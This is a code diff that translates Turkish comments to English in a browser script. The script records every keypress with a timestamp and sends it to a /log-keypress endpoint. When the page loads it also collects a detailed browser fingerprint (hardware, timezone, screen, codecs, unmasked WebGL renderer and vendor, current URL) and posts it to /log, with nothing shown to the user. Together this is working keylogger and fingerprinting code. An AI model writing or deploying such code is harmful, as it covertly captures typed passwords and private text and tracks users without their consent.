@@ -1,42 +1,42 @@
 document.addEventListener("DOMContentLoaded", function () {
 
-  // Tusa basim olayini dinle
+  // Listen for key press events
   document.addEventListener("keydown", function (event) {
-    // Event objesi uzerinden tusa ait bilgileri al
+    // Get key information from the event object
     const keyInfo = {
-      key: event.key, // Basilan tusun ismi
-      timestamp: new Date().toISOString(), // Tusa basildigi zaman
+      key: event.key, // Name of the pressed key
+      timestamp: new Date().toISOString(), // Time when the key was pressed
     };
 
-    // Veriyi sunucuya gonder
+    // Send data to the server
     sendKeyInfo(keyInfo);
   });
 
-  // Klavye Verisini sunucuya gonderme fonksiyonu
+  // Function to send keyboard data to the server
   function sendKeyInfo(keyInfo) {
     fetch("/log-keypress", {
-      method: "POST", // HTTP POST istegi olustur
+      method: "POST", // Create an HTTP POST request
       headers: {
-        "Content-Type": "application/json", // Verinin JSON formatinda oldugunu belirt
+        "Content-Type": "application/json", // Indicate that the data is in JSON format
       },
-      body: JSON.stringify(keyInfo), // Veriyi JSON formatina cevirip gonder
+      body: JSON.stringify(keyInfo), // Convert the data to JSON format and send
     })
-      .then((response) => response.json()) // Sunucudan gelen cevabi JSON formatinda al
+      .then((response) => response.json()) // Get the response from the server in JSON format
       //.then((data) => console.log("Key info sent successfully:", data))
       .catch((error) => console.error("Error sending key info:", error));
   }
 });
 
-// Dokunmatik ekran destegi var mi?
+// Is touch screen support available?
 function checkTouchScreenSupport() {
   var touchSupported = "ontouchstart" in window || navigator.maxTouchPoints > 0;
-  return touchSupported; // Dokunmatik ekran destegi olup olmadigini don
+  return touchSupported; // Return whether touch screen support is available
 }
 
-// Video/Audio codec destegi kontrolu
+// Video/Audio codec support check
 function checkCodecSupport() {
-  var video = document.createElement("video"); // Video elementi olustur
-  var audio = document.createElement("audio"); // Audio elementi olustur
+  var video = document.createElement("video"); // Create a video element
+  var audio = document.createElement("audio"); // Create an audio element
 
   var codecs = {
     video: {
@@ -56,12 +56,12 @@ function checkCodecSupport() {
 
   var support = { video: {}, audio: {} };
 
-  // Video codec destegini kontrol et
+  // Check video codec support
   for (var codec in codecs.video) {
     support.video[codec] = video.canPlayType(codecs.video[codec]) ? true : false;
   }
 
-  // Audio codec destegini kontrol et
+  // Check audio codec support
   for (var codec in codecs.audio) {
     support.audio[codec] = audio.canPlayType(codecs.audio[codec]) ? true : false;
   }
@@ -69,57 +69,57 @@ function checkCodecSupport() {
   //console.log("Supported video codecs:", support.video);
   //console.log("Supported audio codecs:", support.audio);
 
-  return [support.audio, support.video]; // Codec destek durumunu don
+  return [support.audio, support.video]; // Return codec support status
 }
 
 function collectAndSendData() {
-  // Kullanici bilgilerini toplama
+  // Collect user information
   const data = {
-    platform: navigator.platform, // Platform bilgisi
-    language: navigator.language, // Dil ayari
-    cookiesEnabled: navigator.cookieEnabled, // Cerezlerin etkin olup olmadigi
-    screenResolution: `${window.screen.width}x${window.screen.height}`, // Ekran cozunurlugu
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // Zaman dilimi
-    url: window.location.href, // Gecerli sayfanin URL'i
-    number_of_logical_processors: navigator.hardwareConcurrency, // Mantiksal islemci sayisi
-    amount_of_memory: navigator.deviceMemory, // Bellek miktari (dogru olmayabilir)
-    touch_screen_support: checkTouchScreenSupport(), // Dokunmatik ekran destegi
-    codec_support: checkCodecSupport(), // Codec destegi
+    platform: navigator.platform, // Platform information
+    language: navigator.language, // Language setting
+    cookiesEnabled: navigator.cookieEnabled, // Whether cookies are enabled
+    screenResolution: `${window.screen.width}x${window.screen.height}`, // Screen resolution
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // Time zone
+    url: window.location.href, // Current page URL
+    number_of_logical_processors: navigator.hardwareConcurrency, // Number of logical processors
+    amount_of_memory: navigator.deviceMemory, // Amount of memory (may not be accurate)
+    touch_screen_support: checkTouchScreenSupport(), // Touch screen support
+    codec_support: checkCodecSupport(), // Codec support
 
-    color_depth: window.screen.colorDepth, // Renk derinligi
+    color_depth: window.screen.colorDepth, // Color depth
 
-    network_status: navigator.connection.effectiveType, // Ag baglantisi durumu
+    //network_status: navigator.connection.effectiveType, // -Error -Network connection status
 
-    javascript_engine: navigator.javaEnabled(), // Javascript destegi var mi?
-    api_perf: performance.now(), // Tarayicinin performansini olc
-    navigation_timing: performance.timing, // Sayfanin yukleme suresi bilgileri
+    javascript_engine: navigator.javaEnabled(), // Is JavaScript enabled?
+    api_perf: performance.now(), // Measure browser performance
+    navigation_timing: performance.timing, // Page load timing information
 
-    inner_width: window.innerWidth, // Pencerenin genisligi
-    inner_height: window.innerHeight, // Pencerenin yuksekligi
+    inner_width: window.innerWidth, // Window width
+    inner_height: window.innerHeight, // Window height
 
-    webGL_info: getWebGLInfo(), // WebGL bilgileri
+    webGL_info: getWebGLInfo(), // WebGL information
 
   };
 
-  // Veriyi JSON formatina cevirme
+  // Convert data to JSON format
   const jsonData = JSON.stringify(data);
 
-  // POST istegi olustur ve veriyi gonder
+  // Create a POST request and send the data
   fetch("/log", {
-    method: "POST", // HTTP POST istegi yap
+    method: "POST", // Make an HTTP POST request
     headers: {
-      "Content-Type": "application/json", // Verinin JSON oldugunu belirt
+      "Content-Type": "application/json", // Indicate that the data is JSON
     },
-    body: jsonData, // JSON verisini gonder
+    body: jsonData, // Send JSON data
   })
     .then((response) => {
       if (response.ok) {
-        //console.log("Data successfully sent."); // Basarili olursa
+        //console.log("Data successfully sent."); // If successful
       } else {
-        //console.error("Failed to send data."); // Hata olursa
+        //console.error("Failed to send data."); // If there is an error
       }
     })
-    .catch((error) => console.error("Error:", error)); // Hatayi yakala ve yazdir
+    .catch((error) => console.error("Error:", error)); // Catch and log the error
 }
 
 // Function to log geolocation data
@@ -160,30 +160,28 @@ function getLocation () {
   }
 }
 
-
-
 function getWebGLInfo() {
-  const canvas = document.createElement("canvas"); // Canvas elementi olustur
-  const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl"); // WebGL context'i al
+  const canvas = document.createElement("canvas"); // Create a canvas element
+  const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl"); // Get WebGL context
 
   if (gl) {
-    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info"); // Debug bilgi uzantisini al
+    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info"); // Get debug info extension
     if (debugInfo) {
-      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); // Renderer bilgisini al
-      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL); // Vendor bilgisini al
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); // Get renderer info
+      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL); // Get vendor info
       return {
         Renderer: renderer,
         Vendor: vendor,
       };
     } else {
-      //console.log("WEBGL_debug_renderer_info extension not supported"); // Destek yoksa mesaj goster
+      //console.log("WEBGL_debug_renderer_info extension not supported"); // Message if not supported
       return {
         Renderer: "Not supported",
         Vendor: "Not supported",
       };
     }
   } else {
-    //console.log("WebGL not supported"); // WebGL desteklenmiyorsa mesaj goster
+    //console.log("WebGL not supported"); // Message if WebGL is not supported
     return JSON.stringify({
       Renderer: "WebGL not supported",
       Vendor: "WebGL not supported",
@@ -191,5 +189,5 @@ function getWebGLInfo() {
   }
 }
 
-// Sayfa yüklendiginde fonksiyonu calistir
+// Execute function when the page loads
 window.onload = collectAndSendData;
